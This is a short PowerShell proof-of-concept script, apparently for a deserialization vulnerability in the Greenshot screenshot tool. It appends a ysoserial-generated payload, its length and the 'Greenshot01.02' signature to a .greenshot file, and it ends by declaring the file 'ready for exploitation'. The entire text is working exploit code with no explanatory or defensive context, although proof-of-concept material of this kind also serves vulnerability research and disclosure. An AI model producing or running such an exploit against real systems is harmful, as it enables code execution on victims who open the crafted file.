#Load the Payload generated by ysoserial
$payload = Get-Content .\payload.bin -Encoding Byte
#Grab the length of the payload
$length = $payload.Length
Add-Type -AssemblyName System.Drawing
# Target .greenshot file for the attack
$filename = "$home\Documents\Window.greenshot"
 
# Append the payload to the PNG file
$payload | Add-Content -Path $filename -Encoding Byte -NoNewline 
# Append the length of the payload
[System.BitConverter]::GetBytes([long]$length) | Add-Content -Path $filename -Encoding  Byte -NoNewline
# Append the signature
"Greenshot01.02" | Add-Content -path $filename -NoNewline -Encoding Ascii
# File is now ready for exploitation 
